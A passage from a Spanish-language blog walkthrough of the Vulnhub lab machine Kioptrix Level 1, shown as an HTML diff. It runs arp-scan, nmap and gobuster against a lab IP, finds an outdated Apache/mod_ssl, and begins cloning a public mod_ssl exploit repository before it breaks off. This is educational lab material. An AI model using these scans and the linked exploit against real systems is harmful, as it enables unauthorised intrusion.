@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Kioptrix Level 1 Walkthrough - AntuSec</title><meta name="Description" content="Blog de AntuSec, articulos sobre ctfs y ciberseguridad"><meta property="og:url" content="http://localhost:1313/kioptrix_level_1/">
+  <meta property="og:site_name" content="AntuSec">
+  <meta property="og:title" content="Kioptrix Level 1 Walkthrough">
+  <meta property="og:description" content="Kioptrix: Level 1 Instalación Si iniciamos la maquina por defecto la tarjeta de red esta en modo brigded y esto no es para nada recomendable por lo que debemos cambiarlo a modo NAT para ello debemos ir al archivo de configuración ubicado en la carpeta de la maquina
+Buscamos Donde ponga Brigded y lo cambiamos por NAT">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-08-14T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-08-14T11:24:09+02:00">
+    <meta property="article:tag" content="Walkthrough">
+    <meta property="article:tag" content="Vulnhub">
+    <meta property="article:tag" content="TjNull">
+    <meta property="article:tag" content="OSCP">
+    <meta property="article:tag" content="Easy">
+    <meta property="og:image" content="http://localhost:1313/kioptrix_level_1/preimagenKioptrix.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/kioptrix_level_1/preimagenKioptrix.png">
+  <meta name="twitter:title" content="Kioptrix Level 1 Walkthrough">
+  <meta name="twitter:description" content="Kioptrix: Level 1 Instalación Si iniciamos la maquina por defecto la tarjeta de red esta en modo brigded y esto no es para nada recomendable por lo que debemos cambiarlo a modo NAT para ello debemos ir al archivo de configuración ubicado en la carpeta de la maquina
+Buscamos Donde ponga Brigded y lo cambiamos por NAT">
+<meta name="application-name" content="AntuSec">
+<meta name="apple-mobile-web-app-title" content="AntuSec">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/kioptrix_level_1/" /><link rel="next" href="http://localhost:1313/kioptrix_level_2/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Kioptrix Level 1 Walkthrough",
+        "inLanguage": "es",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/kioptrix_level_1\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/localhost:1313\/kioptrix_level_1\/preimagenKioptrix.png",
+                            "width":  686 ,
+                            "height":  367 
+                        }],"genre": "posts","keywords": "Walkthrough, Vulnhub, TjNull, OSCP, Easy","wordcount":  1615 ,
+        "url": "http:\/\/localhost:1313\/kioptrix_level_1\/","datePublished": "2023-08-14T00:00:00+00:00","dateModified": "2023-08-14T11:24:09+02:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/localhost:1313\/images\/avatar.png",
+                    "width":  398 ,
+                    "height":  292 
+                }},"author": {
+                "@type": "Person",
+                "name": "Antu"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="AntuSec"><span class="header-title-pre"><i class='far fa-kiss-wink-heart' aria-hidden='true'></i></span>AntuSec</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Publicaciones </a><a class="menu-item" href="/tags/"> Etiquetas </a><a class="menu-item" href="/categories/"> Categorias </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Busca títulos o contenido..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Buscar">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Limpiar">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Cambia el tema">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a><a href="javascript:void(0);" class="menu-item language" title="Selecciona el lenguage">
+                    <i class="fa fa-globe" aria-hidden="true"></i>
+                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/en/kioptrix_level_1/">English</option><option value="/kioptrix_level_1/" selected>Español</option></select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="AntuSec"><span class="header-title-pre"><i class='far fa-kiss-wink-heart' aria-hidden='true'></i></span>AntuSec</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Busca títulos o contenido..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Buscar">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Limpiar">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancelar
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Publicaciones</a><a class="menu-item" href="/tags/" title="">Etiquetas</a><a class="menu-item" href="/categories/" title="">Categorias</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Cambia el tema">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="Selecciona el lenguage">
+                    <i class="fa fa-globe" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/en/kioptrix_level_1/">English</option><option value="/kioptrix_level_1/" selected>Español</option></select>
+                </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contenido</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Kioptrix Level 1 Walkthrough</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>Antu</a></span>&nbsp;<span class="post-category">incluido en <a href="/categories/vulnhub/"><i class="far fa-folder" aria-hidden="true"></i>Vulnhub</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2023-08-14">2023-08-14</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;1615 palabras&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;8 minutos&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/kioptrix_level_1/preimagenKioptrix.png"
+        data-srcset="/kioptrix_level_1/preimagenKioptrix.png, /kioptrix_level_1/preimagenKioptrix.png 1.5x, /kioptrix_level_1/preimagenKioptrix.png 2x"
+        data-sizes="auto"
+        alt="/kioptrix_level_1/preimagenKioptrix.png"
+        title="/kioptrix_level_1/preimagenKioptrix.png" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contenido</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#instalación">Instalación</a></li>
+    <li><a href="#resolución-de-maquina">Resolución de Maquina</a>
+      <ul>
+        <li><a href="#analisis-de-vulnerabilidades">Analisis de vulnerabilidades</a></li>
+        <li><a href="#explotacion">Explotacion</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="kioptrix-level-1">Kioptrix: Level 1</h1>
+<h2 id="instalación">Instalación</h2>
+<p>Si iniciamos la maquina por defecto la tarjeta de red esta en modo brigded y esto no es para nada recomendable por lo que debemos cambiarlo a modo NAT para ello debemos ir al archivo de configuración ubicado en la carpeta de la maquina</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/kioptrix_level_1/Untitled.png"
+        data-srcset="/kioptrix_level_1/Untitled.png, /kioptrix_level_1/Untitled.png 1.5x, /kioptrix_level_1/Untitled.png 2x"
+        data-sizes="auto"
+        alt="/kioptrix_level_1/Untitled.png"
+        title="Untitled" width="851" height="404" /></p>
+<p>Buscamos Donde ponga Brigded y lo cambiamos por NAT</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/kioptrix_level_1/Untitled%201.png"
+        data-srcset="/kioptrix_level_1/Untitled%201.png, /kioptrix_level_1/Untitled%201.png 1.5x, /kioptrix_level_1/Untitled%201.png 2x"
+        data-sizes="auto"
+        alt="/kioptrix_level_1/Untitled%201.png"
+        title="Untitled" width="627" height="508" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#cambiar</span>
+</span></span><span class="line"><span class="cl">ethernet0.networkName <span class="o">=</span> <span class="s2">&#34;Bridged&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#por</span>
+</span></span><span class="line"><span class="cl">ethernet0.networkName <span class="o">=</span> <span class="s2">&#34;NAT&#34;</span></span></span></code></pre></div></div>
+<p>Después configuramos nuestra tarjeta de red como NAT e iniciamos.</p>
+<h2 id="resolución-de-maquina">Resolución de Maquina</h2>
+<h3 id="analisis-de-vulnerabilidades">Analisis de vulnerabilidades</h3>
+<p>Empezamos con un escaneo a la red local a través de arp-scan.</p>
+<p>Introducimos la interfaz (eth0) que se comunica con la maquina Kioptrix.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arp-scan -I eth0 --localnet</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/kioptrix_level_1/Untitled%202.png"
+        data-srcset="/kioptrix_level_1/Untitled%202.png, /kioptrix_level_1/Untitled%202.png 1.5x, /kioptrix_level_1/Untitled%202.png 2x"
+        data-sizes="auto"
+        alt="/kioptrix_level_1/Untitled%202.png"
+        title="Untitled" width="736" height="222" /></p>
+<p>A continuación realizamos un escaneo con nmap.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- --open  -T5 -n -Pn -vvv 192.168.66.158 -oN Target</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/kioptrix_level_1/Untitled%203.png"
+        data-srcset="/kioptrix_level_1/Untitled%203.png, /kioptrix_level_1/Untitled%203.png 1.5x, /kioptrix_level_1/Untitled%203.png 2x"
+        data-sizes="auto"
+        alt="/kioptrix_level_1/Untitled%203.png"
+        title="Untitled" width="582" height="516" /></p>
+<p>Tras un primer escaneo pasamos a realizar otro para ver la versión de los servicios de los puertos abiertos.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p22,80,111,139,443,1024 -sCV 192.168.66.158</span></span></code></pre></div></div>
+<p>Output:</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-08-10 17:57 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.66.158
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00024s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE     VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh         OpenSSH 2.9p2 <span class="o">(</span>protocol 1.99<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_sshv1: Server supports SSHv1
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">1024</span> b8746cdbfd8be666e92a2bdf5e6f6486 <span class="o">(</span>RSA1<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">1024</span> 8f8e5b81ed21abc180e157a33c85c471 <span class="o">(</span>DSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">1024</span> ed4ea94a0614ff1514ceda3a80dbe281 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http        Apache httpd 1.3.20 <span class="o">((</span>Unix<span class="o">)</span>  <span class="o">(</span>Red-Hat/Linux<span class="o">)</span> mod_ssl/2.8.4 OpenSSL/0.9.6b<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/1.3.20 <span class="o">(</span>Unix<span class="o">)</span>  <span class="o">(</span>Red-Hat/Linux<span class="o">)</span> mod_ssl/2.8.4 OpenSSL/0.9.6b
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Test Page <span class="k">for</span> the Apache Web Server on Red Hat Linux
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl">111/tcp  open  rpcbind     <span class="m">2</span> <span class="o">(</span>RPC <span class="c1">#100000)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rpcinfo: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   program version    port/proto  service
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100000</span>  <span class="m">2</span>            111/tcp   rpcbind
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100000</span>  <span class="m">2</span>            111/udp   rpcbind
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>           1024/tcp   status
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">100024</span>  <span class="m">1</span>           1024/udp   status
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn Samba smbd <span class="o">(</span>workgroup: MYGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">443/tcp  open  ssl/https   Apache/1.3.20 <span class="o">(</span>Unix<span class="o">)</span>  <span class="o">(</span>Red-Hat/Linux<span class="o">)</span> mod_ssl/2.8.4 OpenSSL/0.9.6b
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2023-08-10T22:00:06+00:00<span class="p">;</span> +1m50s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: <span class="m">400</span> Bad Request
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/1.3.20 <span class="o">(</span>Unix<span class="o">)</span>  <span class="o">(</span>Red-Hat/Linux<span class="o">)</span> mod_ssl/2.8.4 OpenSSL/0.9.6b
+</span></span><span class="line"><span class="cl"><span class="p">|</span> sslv2: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   SSLv2 supported
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   ciphers: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     SSL2_DES_192_EDE3_CBC_WITH_MD5
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     SSL2_RC2_128_CBC_WITH_MD5
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     SSL2_RC4_128_WITH_MD5
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     SSL2_DES_64_CBC_WITH_MD5
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     SSL2_RC4_128_EXPORT40_WITH_MD5
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    SSL2_RC4_64_WITH_MD5
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost.localdomain/organizationName<span class="o">=</span>SomeOrganization/stateOrProvinceName<span class="o">=</span>SomeState/countryName<span class="o">=</span>--
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2009-09-26T09:32:06
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2010-09-26T09:32:06
+</span></span><span class="line"><span class="cl">1024/tcp open  status      <span class="m">1</span> <span class="o">(</span>RPC <span class="c1">#100024)</span>
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:7C:3A:16 <span class="o">(</span>VMware<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 1m49s
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_smb2-time: Protocol negotiation failed <span class="o">(</span>SMB2<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: <span class="m">000000000000</span> <span class="o">(</span>Xerox<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 29.02 seconds</span></span></code></pre></div></div>
+<p>Nos fijamos que tiene los puertos 80 Y 443 abiertos, y que tiene una versión de apache 1.3.20 con una versión mod_ssl de 2.8.4.</p>
+<p>Pasamos a ver las webs con el navegador</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://192.168.66.158</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/kioptrix_level_1/Untitled%204.png"
+        data-srcset="/kioptrix_level_1/Untitled%204.png, /kioptrix_level_1/Untitled%204.png 1.5x, /kioptrix_level_1/Untitled%204.png 2x"
+        data-sizes="auto"
+        alt="/kioptrix_level_1/Untitled%204.png"
+        title="Untitled" width="1693" height="810" /></p>
+<p>Tras una revisión a la web y a su código fuente no encontramos nada de interés por lo que pasamos a revisar la web con el puerto 443.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://192.168.66.158:443</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/kioptrix_level_1/Untitled%205.png"
+        data-srcset="/kioptrix_level_1/Untitled%205.png, /kioptrix_level_1/Untitled%205.png 1.5x, /kioptrix_level_1/Untitled%205.png 2x"
+        data-sizes="auto"
+        alt="/kioptrix_level_1/Untitled%205.png"
+        title="Untitled" width="659" height="325" /></p>
+<p>Tampoco se ve nada interesante.</p>
+<p>A continuación he realizado un ataque de fuerza bruta a directorios con gobuster.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster dir -u <span class="s2">&#34;http://192.168.66.158/&#34;</span> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt</span></span></code></pre></div></div>
+<p>Output:</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.5
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://192.168.66.158/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.5
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2023/08/10 17:55:28 Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/manual               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 294<span class="o">]</span> <span class="o">[</span>--&gt; http://127.0.0.1/manual/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/usage                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 293<span class="o">]</span> <span class="o">[</span>--&gt; http://127.0.0.1/usage/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/mrtg                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 292<span class="o">]</span> <span class="o">[</span>--&gt; http://127.0.0.1/mrtg/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Progress: <span class="m">219977</span> / <span class="m">220561</span> <span class="o">(</span>99.74%<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2023/08/10 17:56:39 <span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span></span></span></code></pre></div></div>
+<p>Pero no he podido acceder a ningún directorio ya que soy redirigido a urls locales de la maquina.
+Tras buscar con searchsploit la versión de Apache obtenemos el siguiente resultado:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/kioptrix_level_1/Untitled%206.png"
+        data-srcset="/kioptrix_level_1/Untitled%206.png, /kioptrix_level_1/Untitled%206.png 1.5x, /kioptrix_level_1/Untitled%206.png 2x"
+        data-sizes="auto"
+        alt="/kioptrix_level_1/Untitled%206.png"
+        title="Untitled" width="1076" height="480" /></p>
+<p>Nos interesa los exploits en los que pone mod_ssl, pero al compilarlos dan errores por lo que hemos pasado a buscar la versión de apache y mod_ssl en Google en busca de exploits y encontramos la siguiente pagina de GitHub con el archivo en .c modificado el cual no da problemas de compilación.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">https://github.com/heltonWernik/OpenLuck</span></span></code></pre></div></div>
+<p>Clonamos el repositorio en nuestra maquina:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/heltonWernik/OpenFuck.git</span></span></code></pre></div></div>
+<p>Instalamos las librerías necesarias</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
